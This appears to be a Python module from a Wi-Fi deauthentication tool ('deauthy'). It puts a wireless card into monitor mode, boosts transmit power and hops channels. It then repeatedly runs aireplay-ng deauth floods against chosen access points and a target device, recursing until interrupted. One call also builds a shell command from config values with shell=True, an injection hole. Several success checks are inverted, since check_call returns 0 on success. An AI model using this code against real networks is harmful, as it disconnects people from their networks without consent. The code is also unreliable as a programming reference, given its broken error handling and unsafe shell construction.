from socket import if_nameindex
from deauthy.deauthy_types import Interface, BSSID, ESSID
from subprocess import DEVNULL, STDOUT, check_call, check_output
import sys
import json
import os

from deauthy.terminal import Terminal

class Functs:
    def prompt_for_ifaces():
        from deauthy.terminal import Terminal
        white       = Terminal.White
        yellow      = Terminal.Yellow
        bold        = Terminal.Bold
        light_white = Terminal.Light_white
        end         = Terminal.End
        light_blue  = Terminal.Light_blue
        light_green = Terminal.Light_green
        red         = Terminal.Red
        cards = []
        interfaces = {} # type: dict[str, str]
        def gather_ifaces():
            pos = 1
            for ifaces in if_nameindex():
                print(f"{white}[{yellow}{pos}{white}] {white}{ifaces[1]}")
                cards.append(str(pos))
                interfaces[str(pos)] = ifaces[1]
                pos += 1
            return pos-1
        ifaces = gather_ifaces()
        try:
            method = Terminal.prompt(question=f"{light_white}select a network interface. Enter corresponding number {light_blue}({yellow}1{white}-{yellow}{ifaces}{light_blue})", allowed_replies=cards, ending_color=yellow)
            selected_card = interfaces[method]
            return selected_card
        except KeyboardInterrupt:
            print(" ")
            Terminal.inform(msg=f"{light_green}{bold}Goodbye!\n{end}Exiting...")
            exit(0)
        except KeyError:
            print(" ")
            Terminal.inform(msg=f"{red}{bold}Hey! {end}{red}That's not a valid interface! >:(\n{red}{bold}AGAIN!")
            Functs.prompt_for_ifaces()

    def is_in_monitor_mode(card: Interface):
        if card.name.endswith(f"mon") or card.name.endswith(f"1"):
            return True
        return False

    def switch(card: Interface, mode: str):
        """
        Accepts either "monitor" or "managed"
        """
        monmethod = get_var("mon_method")
        monsuffix = get_var('monitor_suffix')
        from deauthy.terminal import Terminal
        from deauthy.functs import mod_config
        from halo import Halo
        end = Terminal.End
        def managed():
            with Halo(f"Putting {card.name} into {mode} mode...") as spinner:
                succeeded = False
                if monmethod == "iw":
                    out1 = check_call(["ip", "link", "set", card.name, "down"], stdout=DEVNULL, stderr=STDOUT)
                    out2 = check_call(["iw", "dev", card.name, "set", "type", "managed"], stdout=DEVNULL, stderr=STDOUT)
                    out3 = check_call(["ip", "link", "set", card.name, "up"], stdout=DEVNULL, stderr=STDOUT)
                    out4 = check_call(["iw", card.name, "set", "txpower", "fixed", "3000"], stdout=DEVNULL, stderr=STDOUT)
                    if out1 == 1 and out2 == 1 and out3 == 1 and out4 == 1:
                        succeeded = True
                    else:
                        print(f"""Command "ip link set {card.name} down" exited with exit code {out1}""")
                        print(f"""Command "iw dev {card.name} set type managed" exited with exit code {out2}""")
                        print(f"""Command "ip link set {card.name} up" exited with exit code {out3}""")
                        print(f"""Command "iw {card.name} set txpower fixed 3000" exited with exit code {out4}""")
                if monmethod == "airmon":
                    out = check_call(["airmon-ng", "stop", card.name], stdout=DEVNULL, stderr=STDOUT)
                    if out == 1:
                        succeeded = True
                if succeeded:
                    spinner.succeed(f"""Done.\n{Terminal.Light_green} + {Terminal.White}"{card.name}" ({mode.upper()})\n{Terminal.Red} - {Terminal.White}"{card.name}" (MONITOR){end}""")
                else:
                    spinner.fail(f"Could not put {card.name} in {mode} mode{end}")

        def monitor():
            with Halo(f"Putting {card.name} into {mode} mode...") as spinner:
                succeeded = False
                if monmethod == "iw":
                    out1 = check_call(["ip", "link", "set", card.name, "down"], stdout=DEVNULL, stderr=STDOUT)
                    out2 = check_call(["iw", "dev", card.name, "set", "type", "monitor"], stdout=DEVNULL, stderr=STDOUT)
                    out3 = check_call(["ip", "link", "set", card.name, "up"], stdout=DEVNULL, stderr=STDOUT)
                    out4 = check_call(["iw", card.name, "set", "txpower", "fixed", "3000"], stdout=DEVNULL, stderr=STDOUT)
                    if out1 == 1 and out2 == 1 and out3 == 1 and out4 == 1:
                        succeeded = True
                    else:
                        print(f"""Command "ip link set {card.name} down" exited with exit code {out1}""")
                        print(f"""Command "iw dev {card.name} set type monitor" exited with exit code {out2}""")
                        print(f"""Command "ip link set {card.name} up" exited with exit code {out3}""")
                        print(f"""Command "iw {card.name} set txpower fixed 3000" exited with exit code {out4}""")
                if monmethod == "airmon":
                    out = check_call(["airmon-ng", "start", card.name], stdout=DEVNULL, stderr=STDOUT)
                    if out == 1:
                        succeeded = True
                if succeeded:
                    spinner.succeed(f"""Done.\n{Terminal.Light_green} + {Terminal.White}"{card.name}" ({mode.upper()})\n{Terminal.Red} - {Terminal.White}"{card.name}" (MANAGED){end}""")

                if not succeeded:
                    spinner.fail(f"Could not put {card.name} in {mode} mode{end}")

        modes = {
            "managed":managed,
            "monitor":monitor,
        }

        if monmethod is None:
            Terminal.tell_issue(f"""{Terminal.Red+Terminal.Bold+Terminal.Underline}Uh-Oh. Help! {Terminal.White}I don't know how I should put {Terminal.Light_white}{card.name} {Terminal.White}into {Terminal.Light_white}{mode}.\nYou can specify a way simply with the "{Terminal.Light_green}!interfacemode{Terminal.White}" command.""")
            return
        try:
            modes[mode]()
        except KeyError:
            raise RuntimeError("That's not a valid interface mode.")

    def do_bssid_method(bssid: BSSID):
        from deauthy.functs import get_var
        Functs.BSSID_METHOD.deauth(bssid)
        try:
            Functs.do_bssid_method(bssid)
        except KeyboardInterrupt:
            Functs.switch(card=Interface(get_var('interface')), mode="managed")
            return

    class ChannelSys:
        def hopper(channel_number: int):
            """Hop to a different channel"""
            from deauthy.functs import get_var
            out = check_call(["airmon-ng", "start", f"{get_var('interface')}", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)

    class BSSID_METHOD:
        def deauth(_bssid: BSSID):
            """"""
            from deauthy.functs import get_var

            def ado_bssid_method(bssid_: str, channel: int):
                Functs.ChannelSys.hopper(channel)
                try:
                    out = check_output(f"""aireplay-ng -0 5 -a {bssid_} -c {get_var('target_mac')} {get_var('interface')}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
                    print(f"""==============OUTPUT============\n{out.decode()}\n================================""")
                    if f", but the AP uses channel" in out.decode():
                        print(f"""=========Trying to get channel============\n{out.decode()[out.decode().find(f"AP uses channel")::]}\n===========================================""")
                except KeyboardInterrupt:
                    Functs.switch(Interface(get_var('interface')), "managed")
                    return "stop"
                except:
                    Functs.BSSID_METHOD.deauth(_bssid=_bssid)

            for bssi, chan in _bssid.bssids.items():
                status = ado_bssid_method(bssi, chan)
                if status == "stop":
                    Terminal.inform(f"{Terminal.Light_green+Terminal.Bold+Terminal.Underline}Attack stopped.")
                    return

            Functs.BSSID_METHOD.deauth(_bssid=_bssid)


    class ESSID_METHOD:
        def deauth(eSSID: ESSID):
            """"""
            from deauthy.functs import get_var
            while True:
                current_wiface  = get_var('interface')
                target_mac      = get_var('target_mac')
                channel = eSSID.channel
                Functs.ChannelSys.hopper(channel)
                try:
                    out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID.value, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
                    print(out)
                    Functs.ESSID_METHOD.deauth(ESSID(eSSID.value, channel))
                except KeyboardInterrupt:
                    Functs.switch(Interface(current_wiface), "managed")
                    return
def del_pair(key: str):
    with open("deauthy/conf.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
    try:
        del data[key]
        with open("deauthy/conf.json", "w+") as jsonfile:
            myJSON = json.dump(data, jsonfile, indent=2)
            jsonfile.close()
    except KeyError:
        return

def mod_config(key: str, value):
    with open("deauthy/conf.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
        
    data[key] = value
    with open("deauthy/conf.json", "w+") as jsonfile:
        myJSON = json.dump(data, jsonfile, indent=2)
        jsonfile.close()

def get_var(key: str, from_file: str=None):
    if from_file is None:
        from_file = "deauthy/conf.json"
    try:
        with open("deauthy/conf.json", "r") as jsonfile:
            data = json.load(jsonfile)
            jsonfile.close()
            try:
                val = data[key]
                return val
            except KeyError:
                return None
    except json.decoder.JSONDecodeError:
        Terminal.inform(f"{Terminal.Red}Config file got corrupted.\nResetting it...")
        with open("deauthy/conf.json", "w") as f:
            f.truncate()
            f.write("""{ "not_setup_yet":true }""")
            f.close()
        os.execv(sys.executable, ['python'] + [sys.argv[0]])
